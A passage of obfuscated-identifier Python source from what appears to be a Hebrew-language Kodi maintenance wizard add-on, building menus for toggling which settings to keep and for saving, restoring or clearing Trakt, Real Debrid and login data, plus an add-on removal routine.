	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OOO0000O0000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3444
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOOO00O00OOOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3445
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOOO0OOO0O000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3446
def Menu ():#line:3447
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3448
def saveMenu ():#line:3450
	OO0OOOO0000O00000 ='[COLOR yellow]מופעל[/COLOR]';O00O0O0O0O0O0O00O ='[COLOR blue]מבוטל[/COLOR]'#line:3452
	OOO0O000O0OO0O0OO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3453
	O0O0000OOOO0OOOO0 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3454
	O000O00000O0O00O0 ='true'if KEEPINFO =='true'else 'false'#line:3455
	OO0OO000000OOO000 ='true'if KEEPSOUND =='true'else 'false'#line:3457
	OO00OO0O0O00OO000 ='true'if KEEPVIEW =='true'else 'false'#line:3458
	OOOO000O0O00OO00O ='true'if KEEPSKIN =='true'else 'false'#line:3459
	OO00OO0OO00O0OO00 ='true'if KEEPSKIN2 =='true'else 'false'#line:3460
	O0OOOO0O0O0O0O00O ='true'if KEEPSKIN3 =='true'else 'false'#line:3461
	OOO0O0OOO0OO0OOOO ='true'if KEEPADDONS =='true'else 'false'#line:3462
	OOOO0OOO0O00O0OO0 ='true'if KEEPPVR =='true'else 'false'#line:3463
	OOO0OOO0O0O00OOO0 ='true'if KEEPTVLIST =='true'else 'false'#line:3464
	OOOO0O0O0000O000O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3465
	O0OO00OOO00O0000O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3466
	OOOO0OOO0OO0O000O ='true'if KEEPHUBTV =='true'else 'false'#line:3467
	OO0000OOO0OOOOO0O ='true'if KEEPHUBVOD =='true'else 'false'#line:3468
	O0O000OO0O0000O00 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3469
	O0000OO0O00O000OO ='true'if KEEPHUBKIDS =='true'else 'false'#line:3470
	O0000OOOOO000OO0O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3471
	O00OOOOOOOOO00O00 ='true'if KEEPHUBMENU =='true'else 'false'#line:3472
	OOOOO00O0O000O000 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3473
	OOO000O0O00O0O000 ='true'if KEEPTRAKT =='true'else 'false'#line:3474
	OO0OOOOOOOO000OO0 ='true'if KEEPREAL =='true'else 'false'#line:3475
	OO000OO00000O0000 ='true'if KEEPRD2 =='true'else 'false'#line:3476
	O0OOOO00OO0O0O000 ='true'if KEEPTORNET =='true'else 'true'#line:3477
	OO0O0OOO0000O0OO0 ='true'if KEEPLOGIN =='true'else 'false'#line:3478
	OO000O0OOOO0000O0 ='true'if KEEPSOURCES =='true'else 'false'#line:3479
	O000O00OO000OOOO0 ='true'if KEEPADVANCED =='true'else 'false'#line:3480
	OOOO00O00OOOOOOOO ='true'if KEEPPROFILES =='true'else 'false'#line:3481
	O00OO00O0O0000O00 ='true'if KEEPFAVS =='true'else 'false'#line:3482
	OO0OO0OO0O0OO000O ='true'if KEEPREPOS =='true'else 'false'#line:3483
	O000O0OOOOO0OOOO0 ='true'if KEEPSUPER =='true'else 'false'#line:3484
	O00000OO0O0OOO0OO ='true'if KEEPWHITELIST =='true'else 'false'#line:3485
	OO0O0O000OOO0000O ='true'if KEEPWEATHER =='true'else 'false'#line:3486
	OO0OOO0O0OOO00O0O ='true'if KEEPVICTORY =='true'else 'false'#line:3487
	OOO00O00O0OOOOO00 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3488
	if O00000OO0O0OOO0OO =='true':#line:3490
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3491
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3492
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3493
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3494
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3495
	addFile ('%s שמירת חשבון RD:  '%OO0OOOOOOOO000OO0 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3498
	addFile ('%s שמירת חשבון טראקט:  '%OOO000O0O00O0O000 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3499
	addFile ('%s שמירת מועדפים:  '%O00OO00O0O0000O00 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3502
	addFile ('%s שמירת לקוח טלוויזיה:  '%OOOO0OOO0O00O0OO0 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3503
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%OO0OOO0O0OOO00O0O .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3504
	addFile ('%s שמירת חשבון טלמדיה:  '%OOO00O00O0OOOOO00 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3505
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OOO0OOO0O0O00OOO0 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3506
	addFile ('%s שמירת אריח סרטים:  '%OOOO0O0O0000O000O .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3507
	addFile ('%s שמירת אריח סדרות:  '%O0OO00OOO00O0000O .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3508
	addFile ('%s שמירת אריח טלויזיה:  '%OOOO0OOO0OO0O000O .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3509
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OO0000OOO0OOOOO0O .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3510
	addFile ('%s שמירת אריח ספורט:  '%O0O000OO0O0000O00 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3511
	addFile ('%s שמירת אריח ילדים:  '%O0000OO0O00O000OO .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3512
	addFile ('%s שמירת אריח מוסיקה:  '%O0000OOOOO000OO0O .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3513
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O00OOOOOOOOO00O00 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3514
	addFile ('%s שמירת כל האריחים בסקין:  '%OOOO000O0O00OO00O .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3515
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OO0O0O000OOO0000O .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3516
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OOO0O0OOO0OO0OOOO .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3522
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O000O00000O0O00O0 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3523
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O0O0000OOOO0OOOO0 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3526
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%OO000O0OOOO0000O0 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3527
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO0OO000000OOO000 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3528
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO00OO0O0O00OO000 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3530
	addFile ('%s שמירת פליליסט לאודר:  '%OOOOO00O0O000O000 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3531
	addFile ('%s שמירת הגדרות באפר: '%O000O00OO000OOOO0 .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3536
	addFile ('%s שמירת רשימות ריפו:  '%OO0OO0OO0O0OO000O .replace ('true',OO0OOOO0000O00000 ).replace ('false',O00O0O0O0O0O0O00O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3538
	setView ('files','viewType')#line:3540
def traktMenu ():#line:3542
	OO000OOOO00O0OOOO ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3543
	O000O00OOOO0OO0O0 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3544
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3545
	addFile ('Save Trakt Data: %s'%OO000OOOO00O0OOOO ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3546
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O000O00OOOO0OO0O0 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3547
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3548
	for OO000OOOO00O0OOOO in traktit .ORDER :#line:3550
		OO000OO000OOOOO00 =TRAKTID [OO000OOOO00O0OOOO ]['name']#line:3551
		OOOO000OO00O0O00O =TRAKTID [OO000OOOO00O0OOOO ]['path']#line:3552
		O000O0OOO0O00OOO0 =TRAKTID [OO000OOOO00O0OOOO ]['saved']#line:3553
		O000O00OOOO0OOO0O =TRAKTID [OO000OOOO00O0OOOO ]['file']#line:3554
		O000O0OOOO000OOOO =wiz .getS (O000O0OOO0O00OOO0 )#line:3555
		OO0O0O00O000OO0OO =traktit .traktUser (OO000OOOO00O0OOOO )#line:3556
		OOOOOO00O000OOO00 =TRAKTID [OO000OOOO00O0OOOO ]['icon']if os .path .exists (OOOO000OO00O0O00O )else ICONTRAKT #line:3557
		OO0OOOOOO000O0OO0 =TRAKTID [OO000OOOO00O0OOOO ]['fanart']if os .path .exists (OOOO000OO00O0O00O )else FANART #line:3558
		OOO0OOOOOO0OOO0O0 =createMenu ('saveaddon','Trakt',OO000OOOO00O0OOOO )#line:3559
		OOO00O0O000000O00 =createMenu ('save','Trakt',OO000OOOO00O0OOOO )#line:3560
		OOO0OOOOOO0OOO0O0 .append ((THEME2 %'%s Settings'%OO000OO000OOOOO00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OO000OOOO00O0OOOO )))#line:3561
		addFile ('[+]-> %s'%OO000OO000OOOOO00 ,'',icon =OOOOOO00O000OOO00 ,fanart =OO0OOOOOO000O0OO0 ,themeit =THEME3 )#line:3563
		if not os .path .exists (OOOO000OO00O0O00O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOOOO00O000OOO00 ,fanart =OO0OOOOOO000O0OO0 ,menu =OOO0OOOOOO0OOO0O0 )#line:3564
		elif not OO0O0O00O000OO0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OO000OOOO00O0OOOO ,icon =OOOOOO00O000OOO00 ,fanart =OO0OOOOOO000O0OO0 ,menu =OOO0OOOOOO0OOO0O0 )#line:3565
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0O0O00O000OO0OO ,'authtrakt',OO000OOOO00O0OOOO ,icon =OOOOOO00O000OOO00 ,fanart =OO0OOOOOO000O0OO0 ,menu =OOO0OOOOOO0OOO0O0 )#line:3566
		if O000O0OOOO000OOOO =="":#line:3567
			if os .path .exists (O000O00OOOO0OOO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OO000OOOO00O0OOOO ,icon =OOOOOO00O000OOO00 ,fanart =OO0OOOOOO000O0OO0 ,menu =OOO00O0O000000O00 )#line:3568
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OO000OOOO00O0OOOO ,icon =OOOOOO00O000OOO00 ,fanart =OO0OOOOOO000O0OO0 ,menu =OOO00O0O000000O00 )#line:3569
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O000O0OOOO000OOOO ,'',icon =OOOOOO00O000OOO00 ,fanart =OO0OOOOOO000O0OO0 ,menu =OOO00O0O000000O00 )#line:3570
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3572
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3573
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3574
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3575
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3576
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3577
	setView ('files','viewType')#line:3578
def realMenu ():#line:3580
	OO0O0O000O000OOOO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3581
	O000O0OO00OO00000 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3582
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3583
	addFile ('Save Real Debrid Data: %s'%OO0O0O000O000OOOO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3584
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O000O0OO00OO00000 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3585
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3586
	for OOO00OOOOOO0OOOO0 in debridit .ORDER :#line:3588
		O0OO00OO00O0OOOO0 =DEBRIDID [OOO00OOOOOO0OOOO0 ]['name']#line:3589
		OOO000OO0OOOOO0OO =DEBRIDID [OOO00OOOOOO0OOOO0 ]['path']#line:3590
		OO00OO00000O0OO0O =DEBRIDID [OOO00OOOOOO0OOOO0 ]['saved']#line:3591
		OO00O000OOOO000OO =DEBRIDID [OOO00OOOOOO0OOOO0 ]['file']#line:3592
		O00O0OO00OOO000O0 =wiz .getS (OO00OO00000O0OO0O )#line:3593
		OO0O000O0OO0OOO0O =debridit .debridUser (OOO00OOOOOO0OOOO0 )#line:3594
		OO0000000O0OO0OOO =DEBRIDID [OOO00OOOOOO0OOOO0 ]['icon']if os .path .exists (OOO000OO0OOOOO0OO )else ICONREAL #line:3595
		OO0000O00O0OOO000 =DEBRIDID [OOO00OOOOOO0OOOO0 ]['fanart']if os .path .exists (OOO000OO0OOOOO0OO )else FANART #line:3596
		O0OOO000OOOOO0OO0 =createMenu ('saveaddon','Debrid',OOO00OOOOOO0OOOO0 )#line:3597
		O000OOOOOO000O0OO =createMenu ('save','Debrid',OOO00OOOOOO0OOOO0 )#line:3598
		O0OOO000OOOOO0OO0 .append ((THEME2 %'%s Settings'%O0OO00OO00O0OOOO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOO00OOOOOO0OOOO0 )))#line:3599
		addFile ('[+]-> %s'%O0OO00OO00O0OOOO0 ,'',icon =OO0000000O0OO0OOO ,fanart =OO0000O00O0OOO000 ,themeit =THEME3 )#line:3601
		if not os .path .exists (OOO000OO0OOOOO0OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0000000O0OO0OOO ,fanart =OO0000O00O0OOO000 ,menu =O0OOO000OOOOO0OO0 )#line:3602
		elif not OO0O000O0OO0OOO0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOO00OOOOOO0OOOO0 ,icon =OO0000000O0OO0OOO ,fanart =OO0000O00O0OOO000 ,menu =O0OOO000OOOOO0OO0 )#line:3603
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0O000O0OO0OOO0O ,'authdebrid',OOO00OOOOOO0OOOO0 ,icon =OO0000000O0OO0OOO ,fanart =OO0000O00O0OOO000 ,menu =O0OOO000OOOOO0OO0 )#line:3604
		if O00O0OO00OOO000O0 =="":#line:3605
			if os .path .exists (OO00O000OOOO000OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOO00OOOOOO0OOOO0 ,icon =OO0000000O0OO0OOO ,fanart =OO0000O00O0OOO000 ,menu =O000OOOOOO000O0OO )#line:3606
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOO00OOOOOO0OOOO0 ,icon =OO0000000O0OO0OOO ,fanart =OO0000O00O0OOO000 ,menu =O000OOOOOO000O0OO )#line:3607
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O0OO00OOO000O0 ,'',icon =OO0000000O0OO0OOO ,fanart =OO0000O00O0OOO000 ,menu =O000OOOOOO000O0OO )#line:3608
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3610
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3611
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3612
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3613
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3614
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3615
	setView ('files','viewType')#line:3616
def loginMenu ():#line:3618
	O000000OOOO000OO0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3619
	OOO00O0O0OO000OOO =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3620
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3621
	addFile ('Save Login Data: %s'%O000000OOOO000OO0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3622
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOO00O0O0OO000OOO ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3623
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3624
	for O000000OOOO000OO0 in loginit .ORDER :#line:3626
		OOOO0O00000O0O00O =LOGINID [O000000OOOO000OO0 ]['name']#line:3627
		O0O0OO0O0000O0OOO =LOGINID [O000000OOOO000OO0 ]['path']#line:3628
		O00OO000O0000O0OO =LOGINID [O000000OOOO000OO0 ]['saved']#line:3629
		OO000000OO00O00O0 =LOGINID [O000000OOOO000OO0 ]['file']#line:3630
		O0OOOOO00O0O0OO00 =wiz .getS (O00OO000O0000O0OO )#line:3631
		O000OO0000O0OO000 =loginit .loginUser (O000000OOOO000OO0 )#line:3632
		O0000O00O000OO000 =LOGINID [O000000OOOO000OO0 ]['icon']if os .path .exists (O0O0OO0O0000O0OOO )else ICONLOGIN #line:3633
		O00O00OO0OO0O00O0 =LOGINID [O000000OOOO000OO0 ]['fanart']if os .path .exists (O0O0OO0O0000O0OOO )else FANART #line:3634
		O0O000OOO000OO0O0 =createMenu ('saveaddon','Login',O000000OOOO000OO0 )#line:3635
		O00000000OOOOO0OO =createMenu ('save','Login',O000000OOOO000OO0 )#line:3636
		O0O000OOO000OO0O0 .append ((THEME2 %'%s Settings'%OOOO0O00000O0O00O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O000000OOOO000OO0 )))#line:3637
		addFile ('[+]-> %s'%OOOO0O00000O0O00O ,'',icon =O0000O00O000OO000 ,fanart =O00O00OO0OO0O00O0 ,themeit =THEME3 )#line:3639
		if not os .path .exists (O0O0OO0O0000O0OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0000O00O000OO000 ,fanart =O00O00OO0OO0O00O0 ,menu =O0O000OOO000OO0O0 )#line:3640
		elif not O000OO0000O0OO000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O000000OOOO000OO0 ,icon =O0000O00O000OO000 ,fanart =O00O00OO0OO0O00O0 ,menu =O0O000OOO000OO0O0 )#line:3641
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O000OO0000O0OO000 ,'authlogin',O000000OOOO000OO0 ,icon =O0000O00O000OO000 ,fanart =O00O00OO0OO0O00O0 ,menu =O0O000OOO000OO0O0 )#line:3642
		if O0OOOOO00O0O0OO00 =="":#line:3643
			if os .path .exists (OO000000OO00O00O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O000000OOOO000OO0 ,icon =O0000O00O000OO000 ,fanart =O00O00OO0OO0O00O0 ,menu =O00000000OOOOO0OO )#line:3644
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O000000OOOO000OO0 ,icon =O0000O00O000OO000 ,fanart =O00O00OO0OO0O00O0 ,menu =O00000000OOOOO0OO )#line:3645
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOOOO00O0O0OO00 ,'',icon =O0000O00O000OO000 ,fanart =O00O00OO0OO0O00O0 ,menu =O00000000OOOOO0OO )#line:3646
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3648
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3649
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3650
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3651
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3652
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3653
	setView ('files','viewType')#line:3654
def fixUpdate ():#line:3656
	if KODIV <17 :#line:3657
		O0O0000OO0OOO00O0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3658
		try :#line:3659
			os .remove (O0O0000OO0OOO00O0 )#line:3660
		except Exception as OOOOO0O0OOO0O0O00 :#line:3661
			wiz .log ("Unable to remove %s, Purging DB"%O0O0000OO0OOO00O0 )#line:3662
			wiz .purgeDb (O0O0000OO0OOO00O0 )#line:3663
	else :#line:3664
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3665
def removeAddonMenu ():#line:3667
	OO0O000OO0OO0OOO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3668
	O0OOO00OOO0OOOOOO =[];OOOOO0O00O0OOOO00 =[]#line:3669
	for OO000O0O0OOO0O000 in sorted (OO0O000OO0OO0OOO0 ,key =lambda O000000O000OO0OO0 :O000000O000OO0OO0 ):#line:3670
		O0000000OOOOOOO00 =os .path .split (OO000O0O0OOO0O000 [:-1 ])[1 ]#line:3671
		if O0000000OOOOOOO00 in EXCLUDES :continue #line:3672
		elif O0000000OOOOOOO00 in DEFAULTPLUGINS :continue #line:3673
		elif O0000000OOOOOOO00 =='packages':continue #line:3674
		OO000O0OO00OOOO00 =os .path .join (OO000O0O0OOO0O000 ,'addon.xml')#line:3675
		if os .path .exists (OO000O0OO00OOOO00 ):#line:3676
			O0OO0000O00000OO0 =open (OO000O0OO00OOOO00 )#line:3677
			O0000O0OOOO00000O =O0OO0000O00000OO0 .read ()#line:3678
			OOO000OOO0OO0O0OO =wiz .parseDOM (O0000O0OOOO00000O ,'addon',ret ='id')#line:3679
			OO000O000OOO0O00O =O0000000OOOOOOO00 if len (OOO000OOO0OO0O0OO )==0 else OOO000OOO0OO0O0OO [0 ]#line:3681
			try :#line:3682
				OOOO00000O0OO00OO =xbmcaddon .Addon (id =OO000O000OOO0O00O )#line:3683
				O0OOO00OOO0OOOOOO .append (OOOO00000O0OO00OO .getAddonInfo ('name'))#line:3684
				OOOOO0O00O0OOOO00 .append (OO000O000OOO0O00O )#line:3685
			except :#line:3686
				pass #line:3687
	if len (O0OOO00OOO0OOOOOO )==0 :#line:3688
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3689
		return #line:3690
	if KODIV >16 :#line:3691
		O0OO00OOO0OOO0OO0 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OOO00OOO0OOOOOO )#line:3692
	else :#line:3693
		O0OO00OOO0OOO0OO0 =[];OO0O00O000000OO0O =0 #line:3694
		OOOO0000OO0OOOOO0 =["-- Click here to Continue --"]+O0OOO00OOO0OOOOOO #line:3695
		while not OO0O00O000000OO0O ==-1 :#line:3696
			OO0O00O000000OO0O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOO0000OO0OOOOO0 )#line:3697
			if OO0O00O000000OO0O ==-1 :break #line:3698
			elif OO0O00O000000OO0O ==0 :break #line:3699
			else :#line:3700
				OO0O00OOOOOO0OOO0 =(OO0O00O000000OO0O -1 )#line:3701
				if OO0O00OOOOOO0OOO0 in O0OO00OOO0OOO0OO0 :#line:3702
					O0OO00OOO0OOO0OO0 .remove (OO0O00OOOOOO0OOO0 )#line:3703
					OOOO0000OO0OOOOO0 [OO0O00O000000OO0O ]=O0OOO00OOO0OOOOOO [OO0O00OOOOOO0OOO0 ]#line:3704
				else :#line:3705
					O0OO00OOO0OOO0OO0 .append (OO0O00OOOOOO0OOO0 )#line:3706
					OOOO0000OO0OOOOO0 [OO0O00O000000OO0O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0OOO00OOO0OOOOOO [OO0O00OOOOOO0OOO0 ])#line:3707
	if O0OO00OOO0OOO0OO0 ==None :return #line:3708
	if len (O0OO00OOO0OOO0OO0 )>0 :#line:3709
		wiz .addonUpdates ('set')#line:3710
		for O00O0O0000O0000OO in O0OO00OOO0OOO0OO0 :#line:3711
			removeAddon (OOOOO0O00O0OOOO00 [O00O0O0000O0000OO ],O0OOO00OOO0OOOOOO [O00O0O0000O0000OO ],True )#line:3712
		xbmc .sleep (1000 )#line:3714
		if INSTALLMETHOD ==1 :O0O0000OOO0O00O0O =1 #line:3716
		elif INSTALLMETHOD ==2 :O0O0000OOO0O00O0O =0 #line:3717
